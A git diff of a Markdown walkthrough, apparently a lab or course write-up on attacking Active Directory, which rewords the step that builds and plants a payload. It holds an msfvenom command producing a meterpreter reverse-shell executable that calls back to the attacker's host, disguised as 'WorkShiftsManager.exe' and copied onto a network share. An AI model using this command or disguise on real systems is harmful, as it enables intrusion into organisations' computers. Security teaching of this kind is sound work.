@@ -170,14 +170,13 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	where the option `-r disk:share=~/Desktop/share` allows to share the folder `share` between the Kali machine and the remote server, so we are able to easily move documents between the two devices.
  
  6. **Generate a payload for starting a reverse shell and inject it:**
-	In a *different* shell window, we now proceed generating an exploit whose payload is a `meterpreter` reverse shell client.
-	For doing so, we run the following command on the Kali machine to generate a payload that launches the reverse shell client:
+	In a *different* shell window, we now proceed generating an **exploit** whose payload is a `meterpreter` reverse shell client, running the following command:
 
     `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`
 
-	 `msfvenom` is a payload generator and encoder, through which we build a `.exe` file executable for Windows devices. This payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).
+	 `msfvenom` is a payload generator and encoder, through which we build a `.exe` file (the actual exploit), executable on all Windows devices. Its payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).
 
-	The output of the command execution is the file `WorkShiftsManager.exe` that we will find on the Kali's desktop: its name is deliberately misleading, since we want not to raise any suspicion.
+	The output that we get is the file `WorkShiftsManager.exe` that we will find on the Kali's desktop: its name is deliberately misleading, since we want not to raise any suspicion.
 	
 	We now need to **inject** the exploit into the computers of the organization.
 	For doing so, we can rely on the remote desktop connection that we opened: we copy the executable file into the `share` folder and then, from the server's remote desktop, we copy the file into the network shared folder.
@@ -252,11 +251,11 @@ Other useful information about Active Directory have been retrieved from officia
 
 [^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTExODQxNjc0MzgsOTc3OTEyNTE2LDQ5Mj
-Y2NjQxNywtMTE5NTMwMjgzOCw2NDAwODkyOTksLTE3NDAxODc5
-NDEsLTEzNTE2OTYxMTgsNDg0MjU5MzAsLTE2NDc2ODc1OTIsMT
-A5OTkzMTc0MCwtMTI1MjU2MDcxNywxNDkyMjg2NjgzLDI4MDg0
-NDkwNSwtODA0Njk4ODc1LC0xODg4NzA5NTg0LDEzNDI2MzIzNz
-ksLTExMjcxMDk1NTUsLTIwMTU2NDM5NjAsMjA0MTM1ODI0NCwt
-ODkwODI5MjYyXX0=
+eyJoaXN0b3J5IjpbLTExNzM5OTI5Nyw5Nzc5MTI1MTYsNDkyNj
+Y2NDE3LC0xMTk1MzAyODM4LDY0MDA4OTI5OSwtMTc0MDE4Nzk0
+MSwtMTM1MTY5NjExOCw0ODQyNTkzMCwtMTY0NzY4NzU5MiwxMD
+k5OTMxNzQwLC0xMjUyNTYwNzE3LDE0OTIyODY2ODMsMjgwODQ0
+OTA1LC04MDQ2OTg4NzUsLTE4ODg3MDk1ODQsMTM0MjYzMjM3OS
+wtMTEyNzEwOTU1NSwtMjAxNTY0Mzk2MCwyMDQxMzU4MjQ0LC04
+OTA4MjkyNjJdfQ==
 -->
